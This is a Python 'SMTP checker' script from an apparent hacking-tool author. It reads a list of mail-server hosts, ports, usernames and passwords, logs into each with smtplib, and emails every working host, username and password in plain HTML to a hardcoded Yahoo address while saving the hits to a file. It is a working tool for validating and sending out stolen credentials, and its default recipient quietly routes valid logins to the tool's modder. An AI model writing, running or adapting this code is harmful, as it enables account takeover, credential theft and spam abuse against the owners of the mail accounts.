import sys,os,re,socket,binascii,time,random,threading,smtplib,os.path,string,base64,colorama,requests
import os
import smtplib
import concurrent.futures
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import sys
import time
from platform import system
from time import strftime
from colorama import *
from random import choice
from colorama import Fore,Back,init
colorama.init()

# Now regular ANSI codes should work, even in Windows
CLEAR_SCREEN = '\033[2J'
RED = '\033[31m'   # mode 31 = red forground
BLUE  = "\033[34m"
CYAN  = "\033[36m"
GREEN = "\033[32m"
BOLD    = "\033[m"
REVERSE = "\033[m"

def logo():
        clear = "\x1b[0m"
        colors = [36, 32, 34, 35, 31, 37  ]

        x = """

         />_________________________________
[########[]_________________________________>
         \>    SMTP CHECKER

             Coded by MR SPY
            Moded BY Tux-MacG1v
      https://t.me/I_am_a_silent_killer

         
    """
        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
            time.sleep(0.02)
logo()




class bcolors:
    OK = '\033[92m'  # GREEN
    WARNING = '\033[93m'  # YELLOW
    FAIL = '\033[91m'  # RED
    RESET = '\033[0m'  # RESET COLOR
    
VALIDS = 0
INVALIDS = 0

toaddr = "tuxmacgiv991@yahoo.com" #paste your mail


def check(smtp):
    HOST, PORT, usr, pas = smtp.strip().split('|')
    global VALIDS, INVALIDS
    try:
        server = smtplib.SMTP(HOST, PORT)
        server.ehlo()
        server.starttls()
        server.login(usr, pas)
        msg = MIMEMultipart()
        msg['Subject'] = "CHECKER RESULT : v3"
        msg['From'] = usr
        msg['To'] = toaddr
        msg.add_header('Content-Type', 'text/html')
        data = """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>SMTP WORKED</title>
            <style>
                @media only screen and (max-width: 600px) {
                    .inner-body {
                        width: 100% !important;
                    }
            
                    .footer {
                        width: 100% !important;
                    }
                }
            
                @media only screen and (max-width: 500px) {
                    .button {
                        width: 100% !important;
                    }
                }
                .container{
                    background-color:white;
                    align-items: center;
                }
                a{
                    margin-left: 20%;            
                    font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
                    font-weight: bold;
                    font-size: 30px;
                    color: #f40000;
                    text-decoration: none;
        
                }
                .cont2{
                    margin-top: 5px;
                    background-color: #fcfbcf;
                    width: 100%;
                    height: 300px;
                    border: 0.5px solid #000000 ;
                    }
                p{
                    margin-top: 40px;
                    margin-left: 10px;
                }
                .cont2 > p{
                    color: black;
                    font-weight: bold;
                    font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
                }
            </style>
        
            
        </head>
        <body>
            <div class="container" >
            <a href="https://www.facebook.com/tux.facg1v/">
            "MAIL FROM - Tux MacG1v"
             </a>
            </div>
            <div class="cont2">
                <p>HOST : """ + HOST + """</p>
                <p>PORT : """ + PORT + """</p>
                <p>USER : """ + usr + """</p>
                <p>PASS : """ + pas + """</p>
        
            </div>
        </body>
        </html>
        """
        msg.attach(MIMEText(data, 'html', 'utf-8'))
        server.sendmail(usr, [msg['To']], msg.as_string())
        print(bcolors.OK + '[+]SMTP WORK {} '.format(HOST) + bcolors.RESET)
        open('validsmtp.txt', 'a').write(smtp + "\n")
        VALIDS += 1
        os.system("title " + "[+] SMTP WORKED - VALIDS : {} , INVALIDS : {} .".format(VALIDS, INVALIDS))
    except:
        INVALIDS += 1
        print(bcolors.FAIL + '[-]SMTP NOT WORK {} '.format(smtp) + bcolors.RESET)



if __name__ == '__main__':
    sites = open(input('Enter Your Smtps List :'), 'r').read().splitlines()
    try:
        with concurrent.futures.ThreadPoolExecutor(10) as executor:
            executor.map(check, sites)
    except Exception as e:
        print("Finished, success , Thank you for using.")
